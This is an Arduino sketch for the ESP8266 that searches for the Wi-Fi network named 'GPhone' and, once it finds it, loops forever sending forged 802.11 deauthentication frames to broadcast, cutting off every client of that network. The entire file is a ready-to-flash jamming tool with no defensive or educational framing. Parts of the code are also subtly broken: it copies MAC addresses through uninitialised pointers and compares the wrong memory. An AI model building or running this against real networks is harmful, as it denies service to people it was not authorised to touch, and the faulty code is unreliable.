#include <ESP8266WiFi.h>

#define NUMNET 30

uint8_t numNetworks = 0;
uint32_t *knownMACS[NUMNET];
bool found;
uint8_t targetMAC[6];
uint8_t packetSize;

uint8_t deauthPacket[26] = {
  0xC0, 0x00, // Frame Control
  0x3A, 0x01, // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
  0x00, 0x00, // Fragment & Sequence number
  0x01, 0x00  // Reason code 1 (no reason given)
};

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("Deauthing GPhone");
  found = false;

  // Set WiFi to station mode and disconnect from any AP
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  packetSize = sizeof(deauthPacket);
}

void loop() {
  if(!found){findNewNetworks();}
  else{
    Serial.println("Deauthing...");
    deauthAttack(targetMAC);
  }
  
  delay(20);
}

void deauthAttack(uint8_t* apMac) {
  uint8_t newPacket[packetSize];
  memcpy(newPacket, deauthPacket, packetSize);

  memcpy(&newPacket[10], apMac, 6);
  memcpy(&newPacket[16], apMac, 6);

  for (int i = 0; i < 5; i++) {
    if(wifi_send_pkt_freedom(newPacket, 26, 0) != 0){Serial.print(".");}
    delay(20);  // Adjust delay as needed
  }
}
void findNewNetworks(){
  uint8_t newNumNetworks = WiFi.scanNetworks();

  for (uint8_t i = 0; i < newNumNetworks; i++){
    
    uint8_t* newMAC = WiFi.BSSID(i);
    bool newNetwork = true;

    for (uint8_t k = 0; k < numNetworks; k++){
      if(memcmp(newMAC, &(knownMACS[k]), 6) == 0){
        newNetwork = false;
        break;
      }
    }

    if(newNetwork){
      if (numNetworks < NUMNET) {
          memcpy(knownMACS[numNetworks], newMAC, 6);
          numNetworks++;
        }

      if(WiFi.SSID(i) == "GPhone"){
        Serial.println("Network found");
        Serial.printf("Mac Address: %s\n", WiFi.BSSIDstr(i));
        Serial.printf("Wifi Channel: %d\n", WiFi.channel(i));

        found = true;
        memcpy(targetMAC, newMAC, 6);
        wifi_set_channel(WiFi.channel(i));//same channel as target AP
        
        break;
      }
    }
  }
}